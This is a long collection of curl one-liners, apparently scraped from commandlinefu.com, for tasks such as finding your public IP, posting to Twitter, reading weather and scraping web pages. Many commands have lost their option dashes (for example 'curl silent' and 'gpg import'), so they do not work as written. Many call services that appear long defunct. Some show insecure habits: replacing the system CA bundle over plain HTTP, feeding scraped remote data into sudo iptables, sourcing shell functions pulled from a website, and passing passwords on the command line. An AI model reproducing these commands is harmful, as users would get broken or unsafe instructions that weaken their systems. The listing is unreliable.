curl -s 'http://www.google.com/ig/api?weather=santa+monica,ca'| sed -ne "s/.*temp_c data..//;s/....humidity data.*//;p" | figlet
```

### Show's the main headline from drudgereport.com
```sh
curl -s http://www.drudgereport.com | sed -n '/<! MAIN HEADLINE>/,/<! Main headlines links END ->/p' | grep -oP "(?<=>)[^<].*[^>](?=<)"
```

### show ip adress public
```sh
curl queip.tk/ip
```

### show how many twitter followers a user has
```sh
curl -s http://twitter.com/users/show.xml?screen_name=username | sed -n 's/\<followers_count\>//p' | sed 's/<[^>]*>//g;/</N;//b'
```

### Grab your bibtex file from CiteULike.
```sh
curl -o <bibliography> "http://www.citeulike.org/bibtex/user/<user>"
```

### External IP (raw data)
```sh
curl curlmyip.com
```

### Get your outgoing IP address
```sh
curl -s ip.appspot.com
```

### Get your external IP address
```sh
curl http://my-ip.cc/host.txt
```

### Get your external IP address
```sh
curl http://my-ip.cc/host.xml
```

### Weather on the Command line
```sh
curl -s "http://www.google.com/ig/api?weather=New%20York" | sed 's|.*<temp_f data="\([^"]*\)"/>.*|\1|'
```

### Get Google PageRank
```sh
curl pagerank.bz/yourdomain.com
```

### Get Google Reader unread count
```sh
curl -s -H "Authorization: GoogleLogin auth=$auth" "http://www.google.com/reader/api/0/unread-count?output=json" | tr '{' '\n' | sed 's/.*"count":\([0-9]*\),".*/\1/' | grep -E ^[0-9]+$ | tr '\n' '+' | sed 's/\(.*\)+/\1\n/' | bc
```

### kalarm 1 per minute simplest e-mail beacom for Geovision surveillance DVR
```sh
curl http://www.spam.la/?f=sender | grep secs| awk '{print; exit}' | osd_cat -i 40 -d 30 -l 2
```

### Update twitter with curl
```sh
curl -u username:password -d status="blah blah blah" https://twitter.com/statuses/update.xml
```

### check your up to date delicious links.
```sh
curl -k https://Username:Password@api.del.icio.us/v1/posts/all?red=api | xml2| \grep '@href' | cut -d\= -f 2- | sort | uniq | linkchecker -r0 stdin complete -v -t 50 -F blacklist
```

### get a list of top 1000 sites from alexa
```sh
curl -s -O http://s3.amazonaws.com/alexa-static/top-1m.csv.zip ; unzip -q -o top-1m.csv.zip top-1m.csv ; head -1000 top-1m.csv | cut -d, -f2 | cut -d/ -f1 > topsites.txt
```

### commit message generator - whatthecommit.com
```sh
curl -s http://whatthecommit.com/ | tr -s '\n' ' ' | grep -so 'p>\(.*\)</p' | sed -n 's/..\(.*\)..../\1/p'
```

### Get external IP address (supports IPv4 and IPv6)
```sh
curl ip.telize.com
```

### commit message generator - whatthecommit.com
```sh
curl -s http://whatthecommit.com | sed -n '/<p>/,/<\/p>/p' | sed '$d' | sed 's/<p>//'
```

### Get your public IP using chisono.it
```sh
curl http://www.chisono.it/ip.asp
```

### Speak your horoscope with the command line
```sh
curl -s 'http://www.trynt.com/astrology-horoscope-api/v2/?m=2&d=23' | xmlstarlet sel -t -m '//horoscope' -v 'horoscope' | festival tts
```

### External IP
```sh
curl www.whatismyip.org
```

### Get your current Public IP
```sh
curl icanhazip.com
```

### where am I in google map?
```sh
curl -s http://geoiplookup.wikimedia.org/ | python3 -c 'import sys, json, string, webbrowser; webbrowser.open(string.Template("http://maps.google.com/maps?q=$lat,$lon").substitute(json.loads(sys.stdin.read().split("=")[-1])))'
```

### html formatting
```sh
curl silent http://exsample.com/ | xmllint html format - | more
```

### Get My Public IP Address
```sh
curl http://whatismyip.org
```

### Get your external IP address
```sh
curl icanhazip.com
```

### Get the weather forecast for the next 24 to 48 for your location.
```sh
curl -s http://api.wunderground.com/auto/wui/geo/ForecastXML/index.xml?query=${@:-<YOURZIPORLOCATION>}|xmlstarlet sel -E utf-8 -t -m //forecast/txt_forecast/forecastday -v fcttext -n
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update twitter from command line without reveal your password
```sh
curl -n -d status='Hello from cli' https://twitter.com/statuses/update.xml
```

### Search commandlinefu.com from the command line using the API
```sh
curl "http://www.commandlinefu.com/commands/matching/$(echo "$@" | sed 's/ /-/g')/$(echo -n $@ | base64)/plaintext"
```

### Get DELL Warranty Information from support.dell.com
```sh
curl -Ls "http://support.dell.com/support/DPP/Index.aspx?c=us&cs=08W&l=en&s=biz&ServiceTag=$(dmidecode -s system-serial-number)"|egrep -i '>Your Warranty<|>Product Support for'|html2text -style pretty|egrep -v 'Request|View'|perl -pane 's/^(\s+|\})//g;'
```

### Get your current Public IP
```sh
curl -s http://checkrealip.com/ | grep "Current IP Address" | cut -d ' ' -f 4
```

### See where a shortened url takes you before click
```sh
curl -s http://urlxray.com/display.php?url=http://tinyurl.com/demo-xray | grep -o '<title>.*</title>' | sed 's/<title>.*> \(.*\)<\/title>/\1/g'
```

### get you public ip address
```sh
curl ifconfig.me
```

### Get the browser user-agent
```sh
curl sputnick-area.net/ua
```

### Twitter from commandline with curl
```sh
curl basic user username:password data status="Twitter from commandline with curl" https://twitter.com/statuses/update.xml
```

### Get your external IP address
```sh
curl whatismyip.org
```

### Get your external IP address
```sh
curl http://ipecho.net/plain
```

### Oneliner to get domain names list of all existing domain names (from wikipedia)
```sh
curl http://en.m.wikipedia.org/wiki/List_of_Internet_top-level_domains | grep "<tr valign=\"top\">" | awk -F">" '{ print $5 }' | awk -F"<" '{ print $1 }'
```

### What is my public IP-address?
```sh
curl ifconfig.me
```

### Print trending topics on Twitter
```sh
curl -s search.twitter.com | awk -F'</?[^>]+>' '/\/intra\/trend\//{print $2}'
```

### generate random identicon
```sh
curl -s "http://www.gravatar.com/avatar/`uuidgen | md5sum | awk '{print $1}'`?s=64&d=identicon&r=PG" | display
```

### What is my ip?
```sh
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
```

### Random line from bash.org  (funny IRC quotes)
```sh
curl -s http://bash.org/?random1|grep -oE "<p class=\"quote\">.*</p>.*</p>"|grep -oE "<p class=\"qt.*?</p>"|sed -e 's/<\/p>/\n/g' -e 's/<p class=\"qt\">//g' -e 's/<p class=\"qt\">//g'|perl -ne 'use HTML::Entities;print decode_entities($_),"\n"'|head -1
```

### Geo Weather
```sh
curl -s http://www.google.com/ig/api?weather=$(curl -s "http://api.hostip.info/get_html.php?ip=$(curl -s icanhazip.com)" | grep City | sed 's/City: \(.*\)/\1/' | sed 's/ /%20/g' | sed "s/'/%27/g") | sed 's|.*<temp_f data="\([^"]*\)"/>.*|\1\n|'
```

### Update Twitter From the Linux Command Line
```sh
curl -u user:pass -d status=?I am Tweeting from the shell? http://twitter.com/statuses/update.xml
```

### What is my IP address?
```sh
curl whatismyip.org
```

### Checks your unread Gmail from the command line
```sh
curl -u username silent "https://mail.google.com/mail/feed/atom" | perl -ne 'print "\t" if /<name>/; print "$2\n" if /<(title|name)>(.*)<\/\1>/;
```

### What is my ip?
```sh
curl ifconfig.co
```

### What is my ip?
```sh
curl ifconfig.co/all.json
```

### Get your public IP using chisono.it
```sh
curl icanhazip.com
```

### Speak the last 3 tweets on Mac OS
```sh
curl -s -u user:password  http://twitter.com/statuses/friends_timeline.rss | grep title | sed -ne 's/<\/*title>//gp' | head -n 4 | say -v Bruce
```

### download a specific file
```sh
curl -f -O http://pcbsd.fastbull.org/7.0.2/i386/PCBSD7.0.2-x86-DVD.iso
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Extract a remote tarball in the current directory without having to save it locally
```sh
curl http://example.com/foo.tar.gz | tar zxvf -
```

### get you public ip address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### resume download using curl
```sh
curl -C - -o partially_downloaded_file 'www.example.com/path/to/the/file'
```

### Download all Phrack .tar.gzs
```sh
curl http://www.phrack.org/archives/tgz/phrack[1-67].tar.gz -o phrack#1.tar.gz
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Check if your webserver supports gzip compression with curl
```sh
curl -I -H "Accept-Encoding: gzip,deflate" http://example.org
```

### Twit Amarok "now playing" song
```sh
curl -u <user>:<password> -d status="Amarok, now playing: $(dcop amarok default nowPlaying)" http://twitter.com/statuses/update.json
```

### Search Google from the command line
```sh
curl -A Mozilla http://www.google.com/search?q=test |html2text -width 80
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Save xkcd to a pdf with captions
```sh
curl -sL xkcd.com | grep '<img [^>]*/><br/>' | sed -r 's|<img src="(.*)" title="(.*)" alt="(.*)" /><br/>|\1\t\2\t\3|' > /tmp/a; curl -s $(cat /tmp/a | cut -f1) | convert - -gravity south -draw "text 0,0 \"$(cat /tmp/a | cut -f2)\"" pdf:- > xkcd.pdf
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Get HTTP status code with curl
```sh
curl write-out %{http_code} silent output /dev/null localhost
```

### Google URL shortener
```sh
curl -s -d'&url=URL' http://goo.gl/api/url | sed -e 's/{"short_url":"//' -e 's/","added_to_history":false}/\n/'
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Update dyndns.org with your external IP.
```sh
curl -v -k -u user:password "https://members.dyndns.org/nic/update?hostname=<your_domain_name_here>&myip=$(curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g')&wildcard=NOCHG&mx=NOCHG&backmx=NOCHG"
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Gets a random Futurama quote from /.
```sh
curl -Is slashdot.org | egrep '^X-(F|B|L)' | cut -d \- -f 2
```

### let the cow suggest some commit messages for you
```sh
curl -s http://whatthecommit.com/index.txt | cowsay
```

### Real time satellite wheather wallpaper
```sh
curl http://www.cpa.unicamp.br/imagens/satelite/ult.gif | xli -onroot -fill stdin
```

### Get your public ip
```sh
curl -s ip.appspot.com
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | awk -F'[:,]' '{print $7}'
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -Is slashdot.org | sed -n '5p' | sed 's/^X-//'
```

### A command to post a message to Twitter that includes your geo-location and a short URL.
```sh
curl user "USERNAME:PASSWORD" -d status="MESSAGE_GOES_HERE $(curl -s tinyurl.com/api-create.php?url=URL_GOES_HERE) $(curl -s api.hostip.info/get_html.php?ip=$(curl ip.appspot.com))" -d source="cURL" twitter.com/statuses/update.json -o /dev/null
```

### Retrieve top ip threats from http://isc.sans.org/sources.html and add them into iptables output chain.
```sh
curl -s http://isc.sans.org/sources.html|grep "ipinfo.html"|awk -F"ip=" {'print $2'}|awk -F"\"" {'print $1'}|xargs -n1 sudo iptables -A OUTPUT -j DROP -d > 2&>1
```

### Print trending topics on Twitter
```sh
curl silent search.twitter.com | sed -n '/div id=\"hot\"/,/div/p' | awk -F\> '{print $2}' | awk -F\< '{print $1}' | sed '/^$/d'
```

### Get your external IP address
```sh
curl ip.appspot.com
```

### set desktop background to highest-rated image from Reddit /r/wallpapers
```sh
curl http://www.reddit.com/r/wallpapers.rss | grep -Eo 'http:[^&]+jpg' | head -1 | xargs feh bg-seamless
```

### Geolocate a given IP address
```sh
curl ipinfo.io/<ipaddress>
```

### bulk dl files based on a pattern
```sh
curl -O http://hosted.met-art.com/generated_gallery/full/061606AnnaUkrainePasha/met-art-free-sample-00[00-19].jpg
```

### Download and extract a *tar.gz file with curl.
```sh
curl http://domain.com/file.tar.gz | tar zx
```

### Updating the status on identi.ca using curl.
```sh
curl -u USER:PASS -d status="NEW STATUS" http://identi.ca/api/statuses/update.xml
```

### Updates your no-ip.org account with curl
```sh
curl -u $USERNAME:$PASSWORD "http://dynupdate.no-ip.com/nic/update?hostname=$HOSTNAME"
```

### Get your outgoing IP address
```sh
curl -s icanhazip.com
```

### Get Dollar-Euro exchage rate
```sh
curl -s wap.kitco.com/exrate.wml | awk ' BEGIN { x=0; FS = "<" } { if ($0~"^<br/>") {x=0} if (x==1) {print $1} if ($0~"EUR/US") {x=1} }'
```

### Get your Tweets from the command line
```sh
curl -s -u user:password 'http://twitter.com/statuses/friends_timeline.xml?count=5' | xmlstarlet sel -t -m '//status' -v 'user/screen_name' -o ': ' -v 'text' -n
```

### View online pdf documents in cli
```sh
curl 'LINK' | pdftotext - - | less
```

### get you public ip address
```sh
curl http://ifconfig.me/ip
```

### What is My WAN IP?
```sh
curl -s checkip.dyndns.org | grep -Eo '[0-9\.]+'
```

### validate json
```sh
curl -s -X POST http://www.jsonlint.com/ajax/validate -d json="`cat file.js`" -d reformat=no
```

### Twitpic upload and Tweet
```sh
curl form username=from_twitter form password=from_twitter form media=@/path/to/image form-string "message=tweet" http://twitpic.com/api/uploadAndPost
```

### commit message generator - whatthecommit.com
```sh
curl http://whatthecommit.com/index.txt
```

### Display HTTP-header using curl
```sh
curl -I g.cn
```

### Check your unread Gmail from the command line
```sh
curl -u username silent "https://mail.google.com/mail/feed/atom" | awk 'BEGIN{FS="\n";RS="(</entry>\n)?<entry>"}NR!=1{print "\033[1;31m"$9"\033[0;32m ("$10")\033[0m:\t\033[1;33m"$2"\033[0m"}' | sed -e 's,<[^>]*>,,g' | column -t -s $'\t'
```

### Google URL shortener
```sh
curl -s 'http://ggl-shortener.appspot.com/?url='"$1" | sed -e 's/{"short_url":"//' -e 's/"}/\n/g'
```

### Get your outgoing IP address
```sh
curl -s http://whatismyip.org/ | grep -oP '(\d{1,3}\.){3}\d+'
```

### Download files linked in a RSS feed
```sh
curl $1 | grep -E "http.*\.mp3" | sed "s/.*\(http.*\.mp3\).*/\1/" | xargs wget
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### return external ip
```sh
curl ipinfo.io
```

### display ip address
```sh
curl -s http://myip.dk | grep '<title>' | sed -e 's/<[^>]*>//g'
```

### Dump a web page
```sh
curl -s http://google.com | hexdump -C|less
```

### Backup your OpenWRT config (only the config, not the whole system)
```sh
curl -d 'username=root&password=your-good-password' "http://router/cgi-bin/luci/admin/system/backup?backup=kthxbye" > `date +%Y%d%m`_config_backup.tgz
```

### Your GeoIP location on Google Maps
```sh
curl -s http://geoiplookup.wikimedia.org/|awk -F, '{print $3,$4}'|awk -F'"' '{print "http://maps.google.com/maps?q="$4 "," $8}'
```

### What is my public IP address
```sh
curl ifconfig.me
```

### Get your commandlinefu points (upvotes - downvotes)
```sh
curl -s http://www.commandlinefu.com/commands/by/$1/xml | awk -F'</?div[^>]*>' '/class=\"command\"/{gsub(/&quot;/,"\"",$2); gsub(/&lt;/,"<",$2); gsub(/&gt;/,">",$2); gsub(/&amp;/,"\\&",$2); cmd=$2} /class=\"num-votes\"/{printf("%3i  %s\n", $2, cmd)}'
```

### Get your outgoing IP address
```sh
curl icanhazip.com
```

### Update Ping.fm status
```sh
curl -d api_key="$api_key" -d user_app_key="$user_app_key -d body="$body" -d post_method="default" http://api.ping.fm/v1/user.post
```

### Test load balancers
```sh
curl resolve subdomain.example.com:80:10.100.0.1 subdomain.example.com -I -s
```

### Check a server is up. If it isn't mail me.
```sh
curl -fs brandx.jp.sme 2&>1 > /dev/null || echo brandx.jp.sme ping failed | mail -ne -s'Server unavailable' joker@jp.co.uk
```

### send tweets to twitter (and get user details)
```sh
curl basic user "user:pass" data-ascii "status=tweeting%20from%20%the%20linux%20command%20line" http://twitter.com/statuses/update.json
```

### return external ip
```sh
curl ipinfo.io
```

### Quick and dirty RSS
```sh
curl silent "FEED ADDRESS" |sed -e 's/<\/[^>]*>/\n/g' -e 's/<[^>]*>//g
```

### Find the annual salary of any White House staffer.
```sh
curl -s "http://www.socrata.com/api/views/vedg-c5sb/rows.json?search=Axelrod" | grep "data\" :" | awk '{ print $17 }'
```

### Get the header of a website
```sh
curl -sI http://blog.binfalse.de
```

### Random quote from Borat  no html parsing
```sh
curl -s "http://smacie.com/randomizer/borat.txt" | shuf -n 1 -
```

### Get info about a GitHub user
```sh
curl http://github.com/api/v1/yaml/git
```

### Get info about a GitHub project
```sh
curl http://github.com/api/v1/yaml/search/vim
```

### Get http headers for an url
```sh
curl -I www.commandlinefu.com
```

### online MAC address lookup
```sh
curl -s http://www.macvendorlookup.com/getoui.php?mac=$1 | sed -e 's/<[^>]\+>//g'; echo
```

### online MAC address lookup
```sh
curl -s http://standards.ieee.org/regauth/oui/oui.txt | grep $1
```

### Say something out loud
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=$(echo "$@" | sed 's/ /+/g')" | play -t mp3 -
```

### Download a numbered sequence of files
```sh
curl silent -O "http://www.somewebsite.com/imagedir/image_[00-99].jpg"
```

### HTTP Get of a web page via proxy server with login credentials
```sh
curl -U username[:password] -x proxyserverIP:proxyserverPort webpageURI
```

### grab all commandlinefu shell functions into a single file, suitable for sourcing.
```sh
curl -s http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-2400:25] | grep -oP "^\w+\(\)\ *{.*}"
```

### import gpg key from the web
```sh
curl -s http://defekt.nl/~jelle/pubkey.asc | gpg import
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Which Twitter user are you?
```sh
curl -s http://twitter.com/username | grep 'id="user_' | grep -o '[0-9]*'
```

### Retrieve the size of a file on a server
```sh
curl -s "$URL" |wc -c
```

### get delicious bookmarks on your shell (text version :-))
```sh
curl -u 'username'   https://api.del.icio.us/v1/posts/all   |  sed 's/^.*href=//g;s/>.*$//g;s/"//g' | awk '{print $1}' | grep 'http'
```

### post data with a http request
```sh
curl -d "a1=v1&a2=v2" url
```

### Get an authorization code from Google
```sh
curl -s https://www.google.com/accounts/ClientLogin -d Email=$email -d Passwd=$password -d service=lh2 | grep Auth | sed 's/Auth=\(.*\)/\1/'
```

### Save all commands from commandlinefu.com to plain text sort by vote
```sh
curl http://www.commandlinefu.com/commands/browse/sort-by-votes/plaintext/[0-9000:25] | grep -vE "_curl_|\.com by David" > clf-ALL.txt
```

### Shorten any Url using bit.ly API, using your API Key which enables you to Track Clicks
```sh
curl "http://api.bit.ly/shorten?version=2.0.1&longUrl=<LONG_URL_YOU_WANT_SHORTENED>&login=<YOUR_BITLY_USER_NAME>&apiKey=<YOUR_API_KEY>"
```

### translate what is in the clipboard in english and write it to the terminal
```sh
curl -s "http://ajax.googleapis.com/ajax/services/language/translate?langpair=|en&v=1.0&q=`xsel`" |cut -d \" -f 6
```

### OpenDns IP update via curl
```sh
curl -i -m 60 -k -u user:password 'https://updates.opendns.com/account/ddns.php?'
```

### Twitter update from terminal    (pok3's snipts ?)
```sh
curl -u YourUsername:YourPassword -d status="Your status message go here" http://twitter.com/statuses/update.xml
```

### posts an xml file to a webservice with curl
```sh
curl -X POST -d @request.xml -H 'Content-Type: text/xml' https://hostname/context/service
```

### Get My Public IP Address
```sh
curl -s http://whatismyip.org/
```

### Get your outgoing IP address
```sh
curl -s httpbin.org/ip | jq -r .origin
```

### Displays the current time using HTTP
```sh
curl -Is google.com | grep Date
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | jshon -e world -e population -u
```

### Random quote from Borat
```sh
curl -s http://smacie.com/randomizer/borat.html | sed -nE "s# *<td valign=\"top\"><big><big><big><font face=\"Comic Sans MS\">(.*)</font></big></big></big></td>#\1#p"
```

### Scrape commands from commandline fu's 1st page
```sh
curl -s http://www.commandlinefu.com/commands/browse|egrep '("Fin.*and"|<div class="command">.*</div>)'|sed 's/<[^<]*>//g'|ruby -rubygems -pe 'require "cgi"; $_=sprintf("\n\n%-100s\n\t#%-20s",CGI.unescapeHTML($_).chomp.strip, gets.lstrip) if $.%2'
```

### Get DELL Warranty Information from support.dell.com
```sh
curl -sL http://www.dell.com/support/troubleshooting/us/en/555/Servicetag/$(dmidecode -s system-serial-number) | html2text -style pretty | awk -F\. '/with an end date of/ { print $1 "."}'
```

### Get your outgoing IP address
```sh
curl ifconfig.me
```

### Get curenttly playing track in Last.fm radio
```sh
curl -s http://ws.audioscrobbler.com/1.0/user/<user_id>/recenttracks.rss|grep '<title>'|sed -n '2s/ *<\/\?title>//gp'
```

### List the popular module namespaces on CPAN
```sh
curl http://www.cpan.org/modules/01modules.index.html |awk '{print $1}'|grep -v "<"|sort|uniq -c|grep -v " +[0-9] "
```

### Get your public ip using dyndns
```sh
curl -s http://checkip.dyndns.org/ | grep -o "[[:digit:].]\+"
```

### Look up the definition of a word
```sh
curl dict://dict.org/d:something
```

### Gets the english pronunciation of a phrase
```sh
curl -A "Mozilla" "http://translate.google.com/translate_tts?tl=en&q=hello+world" > hello.mp3
```

### Translates a phrase from English to Portuguese
```sh
curl -s -A "Mozilla" "http://translate.google.com.br/translate_a/t?client=t&text=Hi+world&hl=pt-BR&sl=en&tl=pt&multires=1&ssel=0&tsel=0&sc=1" | awk -F'"' '{print $2}'
```

### Get your external IP address
```sh
curl ifconfig.me/all/json
```

### Use curl to save an MP3 stream
```sh
curl -sS -o $outfile -m $showlengthinseconds $streamurl
```

### Follow a new friend on twitter
```sh
curl -u USERNAME:PASSWORD -d "" http://twitter.com/friendships/create/NAMEOFNEWFRIEND.xml?follow=true
```

### Get your external IP address ( 10 characters long )
```sh
curl ip.nu
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Tweet from Terminal to twitter !
```sh
curl -u yourusername:yourpassword -d status=?Your Message Here? https://twitter.com/statuses/update.xml
```

### Find artist and title of a music cd, UPC code given (first result only)
```sh
curl -s 'http://www.discogs.com/search?q=724349691704' | sed -n '\#/release/#{s/^<div>.*>\(.*\)<\/a><\/div>/\1/p}'
```

### Find a CommandlineFu users average command rating
```sh
curl -s www.commandlinefu.com/commands/by/PhillipNordwall | awk -F\> '/num-votes/{S+=$2; I++}END{print S/I}'
```

### Get a file from SharePoint with cURL
```sh
curl ntlm -u DOMAIN/user https://sharepoint.domain.com/path/to/file
```

### Fixes Centos 6.2 yum's metalink certificate errors
```sh
curl http://curl.haxx.se/ca/cacert.pem -o /etc/pki/tls/certs/ca-bundle.crt
```

### Get a facebook likes quantity from CLI
```sh
curl - https://graph.facebook.com/fql?q=SELECT%20like_count,%20total_count,%20share_count,%20click_count,%20comment_count%20FROM%20link_stat%20WHERE%20url%20=%20%27<URL>%27 | awk -F\" '{ print $7 }' | awk -F":" '{ print $2 }' | awk -F"," '{ print $1 }'
```

### Grab the top 5 CLFUContest one-liners
```sh
curl -sL http://goo.gl/3sA3iW | head -16 | tail -14
```

### Update twitter via curl (and also set the "from" bit)
```sh
curl -u twitter-username -d status="Hello World, Twitter!" -d source="cURL" http://twitter.com/statuses/update.xml
```

### Download all Delicious bookmarks
```sh
curl -u username -o bookmarks.xml https://api.del.icio.us/v1/posts/all
```

### a function to find the fastest DNS server
```sh
curl -s http://public-dns.info/nameserver/br.csv| cut -d, -f1 | xargs -i timeout 1 ping -c1 -w 1 {} | grep time | sed -u "s/.* from \([^:]*\).*time=\([^ ]*\).*/\2\t\1/g" | sort -n | head -n1
```

### Get your external IP address if your machine has a DNS entry
```sh
curl www.whatismyip.com/automation/n09230945.asp
```

### Check if the LHC has destroyed the world
```sh
curl -s http://www.hasthelhcdestroyedtheearth.com/ | sed -En '/span/s/.*>(.*)<.*/\1/p'
```

### backup delicious bookmarks
```sh
curl user login:password -o DeliciousBookmarks.xml -O 'https://api.del.icio.us/v1/posts/all'
```

### Use Dell Service Tag $1 to Find Machine Model [Model Name and Model Number]
```sh
curl -s $dellurl$1 | tr "\"" "\n" | grep "</td></tr><tr><td class=" -m 2 | grep -v "Service Tag" | sed 's/>//g' | sed 's/<\/td<\/tr<tr<td class=//g'
```

### Random Futurama quote
```sh
curl -s "http://subfusion.net/cgi-bin/quote.pl?quote=futurama&number=1" |awk '/<body><br><br><b><hr><br>/ {flag=1;next} /<br><br><hr><br>/{flag=0} flag {print}'
```

### Get all files of particular type (say, PDF) listed on some wegpage (say, example.com)
```sh
curl -s http://example.com | grep -o -P "<a.*href.*>" | grep -o "http.*.pdf" |  xargs -d"\n" -n1  wget -c
```

### Download all Red Hat Manuals - A better way by user Flatcap
```sh
curl -s https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/ | grep -o '[^"]*Linux/7/pdf[^"]*' | xargs -I{} wget https://access.redhat.com{}
```

### Oneliner to get domain names list of all existing domain names (from wikipedia)
```sh
curl -s http://en.m.wikipedia.org/wiki/List_of_Internet_top-level_domains | sed -n '/<tr valign="top">/{s/<[^>]*>//g;p}'
```

### Get ElasticSearch configuration and version details
```sh
curl -XGET 'localhost:9200'
```

### Creating shortened URLs from the command line
```sh
curl -s http://tinyurl.com/create.php?url=http://<website.url>/ | sed -n 's/.*\(http:\/\/tinyurl.com\/[a-z0-9][a-z0-9]*\).*/\1/p' | uniq
```

### A command to post a message and an auto-shortened link to Twitter. The link shortening service is provide by TinyURL.
```sh
curl user "USERNAME:PASSWORD" -d status="MESSAGE_GOES_HERE $(curl -s http://tinyurl.com/api-create.php?url=URL_GOES_HERE)" -d source="cURL" http://twitter.com/statuses/update.json -o /dev/null
```

### shorten url using curl, sed and is.gd
```sh
curl -s -d URL="$1" http://is.gd/create.php | sed '/Your new shortened/!d;s/.*value="\([^"]*\)".*/\1/'
```

### random xkcd comic as xml
```sh
curl -sL 'dynamic.xkcd.com/comic/random/' | awk -F\" '/^<img/{printf("<?xml version=\"1.0\"?>\n<xkcd>\n<item>\n <title>%s</title>\n <comment>%s</comment>\n <image>%s</image>\n</item>\n</xkcd>\n", $6, $4, $2)}'
```

### Find out how old a web page is
```sh
curl -Is http://osswin.sourceforge.net/ | grep Mod
```

### Get your public ip
```sh
curl -s http://sputnick-area.net/ip
```

### List NYC startups that are hiring
```sh
curl -s -L http://nytm.org/made-in-nyc | grep "(hiring)" | sed -re 's/<([^>]+)>//g;s/^([ \t]*)//g'
```

### Bitcoin prices from the command line
```sh
curl btc.cm/last
```

### Download all files from podcast RSS feed
```sh
curl http://url/rss | grep -o '<enclosure url="[^"]*' | grep -o '[^"]*$' | xargs wget -c
```

### Get your external IP address
```sh
curl ifconfig.me
```

### Update twitter via curl
```sh
curl -u user:pass -d status="Tweeting from the shell" http://twitter.com/statuses/update.xml
```

### Retrieve "last modified" timestamp of web resource in UTC seconds
```sh
curl silent head "${url}" | grep 'Last-Modified:' | cut -c 16- | date -f - +'%s'
```

### The wisdom of Cave Johnson
```sh
curl -s http://www.cavejohnsonhere.com/random/ | grep quote_main | cut -d \> -f 2- | fmt -w $(tput cols)
```

### Download all images from a 4chan thread
```sh
curl -s $1 | grep -o -i '<a href="//images.4chan.org/[^>]*>' | sed -r 's%.*"//([^"]*)".*%\1%' | xargs wget
```

### Get My Public IP Address
```sh
curl -s http://myip.dk/ | egrep -m1 -o '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}'
```

### Send email with curl and gmail
```sh
curl -n ssl-reqd mail-from "<user@gmail.com>" mail-rcpt "<user@server.tld>" url smtps://smtp.gmail.com:465 -T file.txt
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### Get HTTP status code with curl AND print response on new line
```sh
curl -s -o /dev/null -w "%{http_code}\n" localhost
```

### List of countries
```sh
curl -s http://www.infoplease.com/countries.html | grep "<td"  | grep ipa  | sed -e 's#html">#\n#g'  | cut -f 1 -d\<  | grep -v "^\ \ *$"
```

### Automagically create a /etc/hosts file based on your DHCP list (only works on Linksys WRT54G router)
```sh
curl -s -u $username:$password http://192.168.1.1/DHCPTable.htm | grep '<td>.* </td>' | sed 's|\t<td>\(.*\) </td>\r|\1|' | tr '\n' ';' | sed 's/\([^;]*\);\([^;]*\);/\2\t\1\n/g'
```

### List your Boxee queue
```sh
curl -u <username> http://app.boxee.tv/api/get_queue | xml2 | grep /boxeefeed/message/description | awk -F= '{print $2}'
```

### return external ip
```sh
curl inet-ip.info
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -sI http://slashdot.org/ | sed -nr 's/X-(Bender|Fry)(.*)/\1\2/p'
```

### download all jpg in webpage
```sh
curl -sm1 http://www.website.com/ | grep -o 'http://[^"]*jpg' | sort -u | wget -qT1 -i-
```

### Get your current Public IP
```sh
curl ifconfig.me
```

### git clone all user repos
```sh
curl -s https://api.github.com/users/tuxcanfly/repos | jq -r  'map(select(.fork == false)) | map(.url) | map(sub("https://api.github.com/repos/"; "git clone git@github.com:")) | @sh' | xargs -n1 sh -c]
```

### Check remote hosts server
```sh
curl -Is http://www.google.com | grep -E '^Server'
```

### Get Stuff.
```sh
curl "http://www.commandlinefu.com/commands/matching/$(echo "$@" | sed 's/ /-/g')/$(echo -n $@ | base64)/plaintext"
```

### lookup a short url with curl
```sh
curl -I -L http://t.co/mQUxL6yS
```

### Another Curl your IP command
```sh
curl -s http://checkip.dyndns.org | sed 's/[a-zA-Z<>/ :]//g'
```

### Fetch the current human population of Earth
```sh
curl -s http://www.census.gov/popclock/data/population/world | python -c 'import json,sys;obj=json.load(sys.stdin);print obj["world"]["population"]'
```

### Get Futurama quotations from slashdot.org servers
```sh
curl -Is slashdot.org | sed -ne '/^X-[FBL]/s/^X-//p'
```

### Fetches a Reddit user's ($USER) link karma
```sh
curl -s http://www.reddit.com/user/$USER/about.json | tr "," "\n" | grep "link_karma" | tr ": " "\n" | grep -E "[0-9]+" | sed s/"^"/"Link Karma: "/
```

### Get your external IP address
```sh
curl ifconfig.me
